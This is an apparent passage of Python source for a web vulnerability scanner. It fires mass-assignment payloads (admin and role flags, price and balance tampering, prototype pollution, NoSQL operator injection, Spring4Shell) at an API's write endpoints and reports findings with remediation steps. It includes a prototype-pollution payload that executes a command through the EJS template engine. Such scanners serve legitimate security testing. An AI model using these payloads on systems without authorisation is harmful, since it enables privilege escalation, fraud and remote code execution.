"""
Mass Assignment Scanner - Enterprise Edition v2.0

Comprehensive mass assignment, object injection, and parameter tampering detection.
Industry-leading coverage for API security and framework-specific vulnerabilities.

Features:
- 100+ dangerous property injection payloads
- Framework-specific detection (Rails, Django, Express, Spring, Laravel)
- Prototype pollution testing (JavaScript/Node.js)
- GraphQL mass assignment
- ORM-specific payloads
- Hidden parameter discovery
- Batch endpoint abuse
- Nested object injection
- Array pollution attacks
- Type confusion attacks
- Real-world CVE patterns

CWE Coverage:
- CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)
- CWE-502: Deserialization of Untrusted Data
- CWE-269: Improper Privilege Management
- CWE-285: Improper Authorization
- CWE-639: Authorization Bypass Through User-Controlled Key

Based on:
- OWASP API Security Top 10
- PortSwigger Web Security Academy
- Bug Bounty methodologies
- Framework-specific documentation
"""

from __future__ import annotations

import asyncio
import json
import re
import secrets
from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import urlparse, urljoin, quote
from enum import Enum

import httpx

from scanning.vuln_scanner import Finding, ScanModule
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


class MassAssignmentVectorType(Enum):
    """Types of mass assignment attack vectors."""
    PRIVILEGE_ESCALATION = "privilege_escalation"
    PROTOTYPE_POLLUTION = "prototype_pollution"
    NESTED_INJECTION = "nested_injection"
    ARRAY_POLLUTION = "array_pollution"
    TYPE_CONFUSION = "type_confusion"
    ORM_INJECTION = "orm_injection"
    HIDDEN_PARAMETER = "hidden_parameter"
    BATCH_ABUSE = "batch_abuse"
    GRAPHQL_MUTATION = "graphql_mutation"


class FrameworkType(Enum):
    """Detected backend framework types."""
    RAILS = "rails"
    DJANGO = "django"
    EXPRESS = "express"
    SPRING = "spring"
    LARAVEL = "laravel"
    FLASK = "flask"
    FASTAPI = "fastapi"
    ASPNET = "aspnet"
    PHOENIX = "phoenix"
    UNKNOWN = "unknown"


@dataclass
class MassAssignmentPayload:
    """Mass assignment attack payload."""
    data: dict
    vector_type: MassAssignmentVectorType
    description: str
    target_framework: Optional[FrameworkType] = None
    severity: str = "HIGH"


@dataclass
class MassAssignmentVulnerability:
    """Detected mass assignment vulnerability."""
    url: str
    method: str
    vector_type: MassAssignmentVectorType
    payload: dict
    evidence: list[str]
    severity: str
    confidence: str
    field_name: str
    impact: str


class MassAssignmentScanner(ScanModule):
    """
    Mass Assignment Scanner - Enterprise Edition v2.0
    
    Comprehensive mass assignment and object injection vulnerability detection.
    
    Attack Categories:
    ==================
    
    1. Privilege Escalation
       - Admin/role field injection
       - Permission array manipulation
       - Verified/approved status bypass
       - Subscription/premium tier abuse
    
    2. Prototype Pollution (JavaScript)
       - __proto__ poisoning
       - constructor.prototype attacks
       - Object.assign vulnerabilities
       - JSON.parse exploitation
    
    3. ORM-Specific Attacks
       - ActiveRecord (Rails)
       - Django ORM
       - Eloquent (Laravel)
       - Hibernate/JPA (Spring)
       - SQLAlchemy (Flask/FastAPI)
    
    4. Hidden Parameter Discovery
       - Debug parameters
       - Internal flags
       - Feature toggles
       - A/B test parameters
    
    5. Type Confusion
       - String to boolean coercion
       - Array to object conversion
       - Number overflow
       - Null injection
    
    6. Batch/Bulk Operations
       - Array parameter pollution
       - Multi-object updates
       - Transaction manipulation
    
    7. GraphQL Mutations
       - Input type abuse
       - Nested mutation injection
       - Directive injection
    """
    
    name = "mass_assignment_scanner"
    
    # =============================================================
    # PRIVILEGE ESCALATION PAYLOADS (30+)
    # =============================================================
    
    PRIVILEGE_ESCALATION_PAYLOADS = [
        # Admin/Superuser flags
        MassAssignmentPayload(
            data={"admin": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Direct admin flag injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"isAdmin": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="camelCase admin flag",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"is_admin": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="snake_case admin flag",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"is_superuser": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Django superuser flag",
            target_framework=FrameworkType.DJANGO,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"is_staff": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Django staff flag",
            target_framework=FrameworkType.DJANGO,
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"superuser": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Generic superuser flag",
            severity="CRITICAL"
        ),
        
        # Role manipulation
        MassAssignmentPayload(
            data={"role": "admin"},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Role string injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"role": "administrator"},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Full administrator role",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"role": "superadmin"},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Super admin role",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"roles": ["admin"]},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Role array injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"roles": ["admin", "user"]},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Multi-role array injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"userRole": "ADMIN"},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="User role uppercase",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"role_id": 1},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Role ID manipulation",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"role_id": 0},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Role ID zero (often admin)",
            severity="HIGH"
        ),
        
        # Permission arrays
        MassAssignmentPayload(
            data={"permissions": ["*"]},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Wildcard permission injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"permissions": ["admin:*", "write:*", "read:*"]},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Full permissions array",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"scopes": ["admin", "write", "read", "delete"]},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="OAuth-style scopes injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"access_level": "admin"},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Access level string",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"accessLevel": 9999},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Numeric access level",
            severity="HIGH"
        ),
        
        # Verification bypass
        MassAssignmentPayload(
            data={"verified": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Account verification bypass",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"email_verified": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Email verification bypass",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"phone_verified": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Phone verification bypass",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"is_active": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Account activation bypass",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"approved": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Approval status bypass",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"banned": False},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Ban status bypass",
            severity="HIGH"
        ),
        
        # Pricing/Balance manipulation
        MassAssignmentPayload(
            data={"price": 0},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Price manipulation to zero",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"price": -1},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Negative price injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"amount": 0.01},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Amount manipulation",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"balance": 999999999},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Balance inflation",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"credits": 999999},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Credits manipulation",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"discount": 100},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="100% discount injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"total": 0},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Total price zeroing",
            severity="CRITICAL"
        ),
        
        # Subscription/Feature flags
        MassAssignmentPayload(
            data={"premium": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Premium account bypass",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"pro_user": True},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Pro user flag",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"subscription_tier": "enterprise"},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Subscription tier injection",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"plan": "unlimited"},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Plan type manipulation",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"trial_ends_at": "2099-12-31T23:59:59Z"},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Trial extension attack",
            severity="MEDIUM"
        ),
        
        # ID manipulation
        MassAssignmentPayload(
            data={"user_id": 1},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="User ID to admin ID",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"owner_id": 1},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Owner ID manipulation",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"tenant_id": "*"},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Multi-tenant bypass",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"organization_id": 1},
            vector_type=MassAssignmentVectorType.PRIVILEGE_ESCALATION,
            description="Organization ID manipulation",
            severity="HIGH"
        ),
    ]
    
    # =============================================================
    # PROTOTYPE POLLUTION PAYLOADS (15+)
    # =============================================================
    
    PROTOTYPE_POLLUTION_PAYLOADS = [
        # Basic __proto__ poisoning
        MassAssignmentPayload(
            data={"__proto__": {"admin": True}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="__proto__ admin poisoning",
            target_framework=FrameworkType.EXPRESS,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"__proto__": {"isAdmin": True}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="__proto__ isAdmin poisoning",
            target_framework=FrameworkType.EXPRESS,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"__proto__": {"role": "admin"}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="__proto__ role poisoning",
            target_framework=FrameworkType.EXPRESS,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"__proto__": {"polluted": True}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="__proto__ detection payload",
            target_framework=FrameworkType.EXPRESS,
            severity="HIGH"
        ),
        
        # Constructor prototype
        MassAssignmentPayload(
            data={"constructor": {"prototype": {"admin": True}}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="constructor.prototype poisoning",
            target_framework=FrameworkType.EXPRESS,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"constructor": {"prototype": {"isAdmin": True}}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="constructor.prototype isAdmin",
            target_framework=FrameworkType.EXPRESS,
            severity="CRITICAL"
        ),
        
        # Nested proto
        MassAssignmentPayload(
            data={"data": {"__proto__": {"admin": True}}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="Nested __proto__ poisoning",
            target_framework=FrameworkType.EXPRESS,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"user": {"__proto__": {"role": "admin"}}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="User object proto poisoning",
            target_framework=FrameworkType.EXPRESS,
            severity="CRITICAL"
        ),
        
        # Proto chains
        MassAssignmentPayload(
            data={"__proto__": {"__proto__": {"admin": True}}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="Double proto chain",
            target_framework=FrameworkType.EXPRESS,
            severity="CRITICAL"
        ),
        
        # RCE variants (CVE-2019-11358 jQuery, CVE-2019-10744 lodash)
        MassAssignmentPayload(
            data={"__proto__": {"shell": "/bin/sh"}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="Shell prototype pollution (RCE)",
            target_framework=FrameworkType.EXPRESS,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"__proto__": {"env": {"SHELL": "/bin/sh"}}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="Environment variable poisoning",
            target_framework=FrameworkType.EXPRESS,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id')//"}},
            vector_type=MassAssignmentVectorType.PROTOTYPE_POLLUTION,
            description="Template engine RCE (EJS)",
            target_framework=FrameworkType.EXPRESS,
            severity="CRITICAL"
        ),
    ]
    
    # =============================================================
    # NESTED INJECTION PAYLOADS
    # =============================================================
    
    NESTED_INJECTION_PAYLOADS = [
        MassAssignmentPayload(
            data={"user": {"role": "admin"}},
            vector_type=MassAssignmentVectorType.NESTED_INJECTION,
            description="Nested user.role injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"user": {"admin": True, "permissions": ["*"]}},
            vector_type=MassAssignmentVectorType.NESTED_INJECTION,
            description="Nested user object with admin",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"data": {"admin": True}},
            vector_type=MassAssignmentVectorType.NESTED_INJECTION,
            description="Data object admin injection",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"attributes": {"role": "admin", "verified": True}},
            vector_type=MassAssignmentVectorType.NESTED_INJECTION,
            description="Attributes object injection",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"profile": {"is_admin": True, "is_staff": True}},
            vector_type=MassAssignmentVectorType.NESTED_INJECTION,
            description="Profile object privilege injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"metadata": {"permissions": ["admin:*"], "role": "superuser"}},
            vector_type=MassAssignmentVectorType.NESTED_INJECTION,
            description="Metadata permission injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"settings": {"admin_mode": True, "debug": True}},
            vector_type=MassAssignmentVectorType.NESTED_INJECTION,
            description="Settings object manipulation",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"account": {"type": "admin", "tier": "enterprise"}},
            vector_type=MassAssignmentVectorType.NESTED_INJECTION,
            description="Account type escalation",
            severity="HIGH"
        ),
    ]
    
    # =============================================================
    # TYPE CONFUSION PAYLOADS
    # =============================================================
    
    TYPE_CONFUSION_PAYLOADS = [
        MassAssignmentPayload(
            data={"admin": "true"},
            vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
            description="String 'true' to boolean coercion",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"admin": 1},
            vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
            description="Number to boolean coercion",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"admin": "1"},
            vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
            description="String '1' to boolean coercion",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"admin": []},
            vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
            description="Empty array type confusion",
            severity="MEDIUM"
        ),
        MassAssignmentPayload(
            data={"admin": {}},
            vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
            description="Empty object type confusion",
            severity="MEDIUM"
        ),
        MassAssignmentPayload(
            data={"admin": None},
            vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
            description="Null injection",
            severity="MEDIUM"
        ),
        MassAssignmentPayload(
            data={"role": ["admin"]},
            vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
            description="Array instead of string",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"id": {"$gt": ""}},
            vector_type=MassAssignmentVectorType.TYPE_CONFUSION,
            description="NoSQL operator injection",
            severity="CRITICAL"
        ),
    ]
    
    # =============================================================
    # ARRAY POLLUTION PAYLOADS
    # =============================================================
    
    ARRAY_POLLUTION_PAYLOADS = [
        MassAssignmentPayload(
            data={"roles": ["admin", "user", "moderator"]},
            vector_type=MassAssignmentVectorType.ARRAY_POLLUTION,
            description="Roles array injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"permissions[]": "admin"},
            vector_type=MassAssignmentVectorType.ARRAY_POLLUTION,
            description="PHP-style array parameter",
            target_framework=FrameworkType.LARAVEL,
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"groups": [{"name": "admin", "id": 1}]},
            vector_type=MassAssignmentVectorType.ARRAY_POLLUTION,
            description="Groups array with admin group",
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"tags": ["verified", "premium", "admin", "trusted"]},
            vector_type=MassAssignmentVectorType.ARRAY_POLLUTION,
            description="Tags array pollution",
            severity="MEDIUM"
        ),
        MassAssignmentPayload(
            data={"scopes": ["read", "write", "admin", "delete", "*"]},
            vector_type=MassAssignmentVectorType.ARRAY_POLLUTION,
            description="OAuth scopes pollution",
            severity="CRITICAL"
        ),
    ]
    
    # =============================================================
    # FRAMEWORK-SPECIFIC PAYLOADS
    # =============================================================
    
    RAILS_PAYLOADS = [
        MassAssignmentPayload(
            data={"user[admin]": True},
            vector_type=MassAssignmentVectorType.ORM_INJECTION,
            description="Rails nested attributes injection",
            target_framework=FrameworkType.RAILS,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"user[role_ids][]": "1"},
            vector_type=MassAssignmentVectorType.ORM_INJECTION,
            description="Rails role_ids array injection",
            target_framework=FrameworkType.RAILS,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"_method": "PUT", "admin": True},
            vector_type=MassAssignmentVectorType.ORM_INJECTION,
            description="Rails HTTP method override + admin",
            target_framework=FrameworkType.RAILS,
            severity="HIGH"
        ),
    ]
    
    DJANGO_PAYLOADS = [
        MassAssignmentPayload(
            data={"is_superuser": True, "is_staff": True, "is_active": True},
            vector_type=MassAssignmentVectorType.ORM_INJECTION,
            description="Django user flags combination",
            target_framework=FrameworkType.DJANGO,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"groups": [1]},
            vector_type=MassAssignmentVectorType.ORM_INJECTION,
            description="Django groups ID injection",
            target_framework=FrameworkType.DJANGO,
            severity="HIGH"
        ),
        MassAssignmentPayload(
            data={"user_permissions": [1, 2, 3]},
            vector_type=MassAssignmentVectorType.ORM_INJECTION,
            description="Django permissions injection",
            target_framework=FrameworkType.DJANGO,
            severity="CRITICAL"
        ),
    ]
    
    LARAVEL_PAYLOADS = [
        MassAssignmentPayload(
            data={"role_id": 1, "is_admin": 1},
            vector_type=MassAssignmentVectorType.ORM_INJECTION,
            description="Laravel Eloquent mass fill",
            target_framework=FrameworkType.LARAVEL,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"permissions": '["*"]'},
            vector_type=MassAssignmentVectorType.ORM_INJECTION,
            description="Laravel permissions JSON",
            target_framework=FrameworkType.LARAVEL,
            severity="CRITICAL"
        ),
    ]
    
    SPRING_PAYLOADS = [
        MassAssignmentPayload(
            data={"class.module.classLoader": ""},
            vector_type=MassAssignmentVectorType.ORM_INJECTION,
            description="Spring4Shell CVE-2022-22965",
            target_framework=FrameworkType.SPRING,
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"authorities[0].authority": "ROLE_ADMIN"},
            vector_type=MassAssignmentVectorType.ORM_INJECTION,
            description="Spring Security authorities injection",
            target_framework=FrameworkType.SPRING,
            severity="CRITICAL"
        ),
    ]
    
    # =============================================================
    # HIDDEN PARAMETER DISCOVERY
    # =============================================================
    
    HIDDEN_PARAMETERS = [
        # Debug/Internal
        "debug", "_debug", "internal", "_internal",
        "test", "_test", "dev", "_dev",
        "bypass", "skip_auth", "skip_validation",
        
        # Feature flags
        "feature_*", "ff_*", "flag_*",
        "enable_*", "disable_*",
        "beta", "alpha", "experimental",
        
        # Admin/Role
        "admin", "is_admin", "isAdmin",
        "staff", "is_staff", "isStaff",
        "superuser", "is_superuser",
        "role", "roles", "role_id",
        "permission", "permissions",
        
        # Verification
        "verified", "confirmed", "approved",
        "active", "enabled", "status",
        
        # Pricing
        "price", "amount", "total",
        "discount", "coupon", "promo",
        "free", "trial", "premium",
    ]
    
    # =============================================================
    # GRAPHQL MUTATION PAYLOADS
    # =============================================================
    
    GRAPHQL_PAYLOADS = [
        MassAssignmentPayload(
            data={"query": "mutation { updateUser(input: {role: \"admin\"}) { id } }"},
            vector_type=MassAssignmentVectorType.GRAPHQL_MUTATION,
            description="GraphQL role mutation injection",
            severity="CRITICAL"
        ),
        MassAssignmentPayload(
            data={"query": "mutation { updateUser(input: {isAdmin: true}) { id } }"},
            vector_type=MassAssignmentVectorType.GRAPHQL_MUTATION,
            description="GraphQL isAdmin mutation",
            severity="CRITICAL"
        ),
    ]
    
    # Write endpoint patterns
    WRITE_ENDPOINT_PATTERNS = [
        "/api/", "/v1/", "/v2/", "/v3/",
        "/user", "/users", "/profile", "/account",
        "/settings", "/config", "/preferences",
        "/register", "/signup", "/create",
        "/update", "/edit", "/modify", "/patch",
        "/order", "/orders", "/cart", "/checkout",
        "/payment", "/subscription", "/billing",
        "/admin", "/manage", "/dashboard",
        "/graphql", "/gql",
    ]
    
    def __init__(self, settings: Settings | None = None) -> None:
        if settings:
            super().__init__(settings)
            self.timeout = settings.timeouts.request_timeout
        else:
            self.timeout = 15.0
        self.tested_payloads: set[str] = set()
        self.detected_framework: Optional[FrameworkType] = None
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Comprehensive mass assignment scan - Enterprise Edition.
        
        Scan Phases:
        1. Framework detection
        2. Privilege escalation testing
        3. Prototype pollution testing
        4. Nested object injection
        5. Type confusion attacks
        6. Array pollution testing
        7. Framework-specific payloads
        8. Hidden parameter discovery
        9. Batch endpoint abuse
        10. GraphQL mutation testing
        """
        findings: list[Finding] = []
        
        base_url = f"https://{host}" if not host.startswith("http") else host
        
        logger.info(f"[Mass Assignment Enterprise v2.0] Starting comprehensive scan on {base_url}")
        
        # Collect endpoints
        endpoints = asset_data.get("endpoints", [])
        api_endpoints = asset_data.get("api_endpoints", [])
        all_endpoints = list(set(endpoints + api_endpoints))
        
        async with httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
        ) as client:
            # Phase 1: Detect framework
            self.detected_framework = await self._detect_framework(client, base_url)
            
            # Filter to write-capable endpoints
            write_endpoints = [
                ep for ep in all_endpoints 
                if self._is_write_endpoint(ep)
            ]
            
            # Use base URL if no endpoints found
            if not write_endpoints:
                write_endpoints = [base_url]
            
            for endpoint in write_endpoints[:20]:
                url = endpoint if endpoint.startswith("http") else urljoin(base_url, endpoint)
                
                await rate_limiter.acquire()
                
                # Phase 2: Privilege escalation
                priv_findings = await self._test_privilege_escalation(
                    client, url, rate_limiter
                )
                findings.extend(priv_findings)
                
                # Phase 3: Prototype pollution
                proto_findings = await self._test_prototype_pollution(
                    client, url, rate_limiter
                )
                findings.extend(proto_findings)
                
                # Phase 4: Nested injection
                nested_findings = await self._test_nested_injection(
                    client, url, rate_limiter
                )
                findings.extend(nested_findings)
                
                # Phase 5: Type confusion
                type_findings = await self._test_type_confusion(
                    client, url, rate_limiter
                )
                findings.extend(type_findings)
                
                # Phase 6: Array pollution
                array_findings = await self._test_array_pollution(
                    client, url, rate_limiter
                )
                findings.extend(array_findings)
                
                # Phase 7: Framework-specific
                if self.detected_framework:
                    fw_findings = await self._test_framework_specific(
                        client, url, rate_limiter
                    )
                    findings.extend(fw_findings)
                
                # Phase 8: Hidden parameters
                hidden_findings = await self._test_hidden_parameters(
                    client, url, rate_limiter
                )
                findings.extend(hidden_findings)
            
            # Phase 9: GraphQL testing
            graphql_findings = await self._test_graphql_mutations(
                client, base_url, rate_limiter
            )
            findings.extend(graphql_findings)
        
        # Deduplicate findings
        findings = self._deduplicate_findings(findings)
        
        logger.info(f"[Mass Assignment Enterprise v2.0] Found {len(findings)} vulnerabilities")
        
        return findings
    
    async def _detect_framework(
        self,
        client: httpx.AsyncClient,
        base_url: str,
    ) -> Optional[FrameworkType]:
        """Detect backend framework from response headers and behavior."""
        try:
            response = await client.get(base_url)
            headers = {k.lower(): v for k, v in response.headers.items()}
            
            # Check headers
            server = headers.get("server", "").lower()
            powered_by = headers.get("x-powered-by", "").lower()
            
            if "express" in powered_by or "node" in server:
                return FrameworkType.EXPRESS
            if "phusion passenger" in server or "rails" in headers.get("x-runtime", ""):
                return FrameworkType.RAILS
            if "django" in powered_by or "wsgi" in server:
                return FrameworkType.DJANGO
            if "laravel" in headers.get("set-cookie", "").lower():
                return FrameworkType.LARAVEL
            if "spring" in headers.get("x-application-context", ""):
                return FrameworkType.SPRING
            if "asp.net" in powered_by:
                return FrameworkType.ASPNET
            if "flask" in headers.get("server", ""):
                return FrameworkType.FLASK
            
            # Check body for framework indicators
            body = response.text.lower()
            if "csrf_token" in body and ("rails" in body or "ruby" in body):
                return FrameworkType.RAILS
            if "__requestverificationtoken" in body:
                return FrameworkType.ASPNET
            if "laravel_session" in headers.get("set-cookie", "").lower():
                return FrameworkType.LARAVEL
                
        except Exception as e:
            logger.debug(f"Framework detection error: {e}")
        
        return FrameworkType.UNKNOWN
    
    def _is_write_endpoint(self, endpoint: str) -> bool:
        """Check if endpoint likely accepts write operations."""
        endpoint_lower = endpoint.lower()
        return any(pattern in endpoint_lower for pattern in self.WRITE_ENDPOINT_PATTERNS)
    
    async def _test_privilege_escalation(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test privilege escalation via mass assignment."""
        findings = []
        
        # Get baseline
        baseline = await self._get_baseline(client, url)
        if not baseline:
            return findings
        
        for payload_obj in self.PRIVILEGE_ESCALATION_PAYLOADS[:20]:
            await rate_limiter.acquire()
            
            payload = payload_obj.data
            payload_key = f"priv:{url}:{json.dumps(payload, sort_keys=True)}"
            
            if payload_key in self.tested_payloads:
                continue
            self.tested_payloads.add(payload_key)
            
            try:
                # Merge with test data
                test_data = {"test_field": "mass_assignment_scan"}
                test_data.update(payload)
                
                response = await client.post(
                    url,
                    json=test_data,
                    headers={"Content-Type": "application/json"}
                )
                
                # Check for injection success
                if await self._check_injection_success(baseline, response, payload):
                    field_name = list(payload.keys())[0]
                    
                    findings.append(Finding(
                        name=f"Mass Assignment: {field_name} Accepted",
                        severity=payload_obj.severity,
                        confidence="HIGH",
                        description=f"The endpoint accepted injected field '{field_name}'. {payload_obj.description}",
                        matched_at=url,
                        evidence=[
                            f"Field: {field_name}",
                            f"Payload: {json.dumps(payload)}",
                            f"Response code: {response.status_code}",
                        ],
                        cwe="CWE-915",
                        cvss_score=9.8 if payload_obj.severity == "CRITICAL" else 7.5,
                        remediation=(
                            "1. Implement allowlist for accepted fields\n"
                            "2. Never directly bind user input to models\n"
                            "3. Use DTOs (Data Transfer Objects)\n"
                            "4. Validate and sanitize all input\n"
                            "5. Use framework-specific protection (strong params, etc.)"
                        ),
                    ))
                    
                    if payload_obj.severity == "CRITICAL":
                        return findings  # Critical finding, stop
                        
            except Exception as e:
                logger.debug(f"Privilege escalation test error: {e}")
        
        return findings
    
    async def _test_prototype_pollution(
        self,
        client: httpx.AsyncClient,
        url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for prototype pollution (Node.js/JavaScript backends)."""
        findings = []
        
        for payload_obj in self.PROTOTYPE_POLLUTION_PAYLOADS:
            await rate_limiter.acquire()
            
            payload = payload_obj.data
            
            try:
                response = await client.post(
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )
                
                body = response.text.lower()
                
                # Check for successful pollution
                if response.status_code == 200:
                    if "polluted" in body or "__proto__" in body:
                        findings.append(Finding(
                            name="Prototype Pollution Vulnerability",
                            severity="CRITICAL",
                            confidence="HIGH",
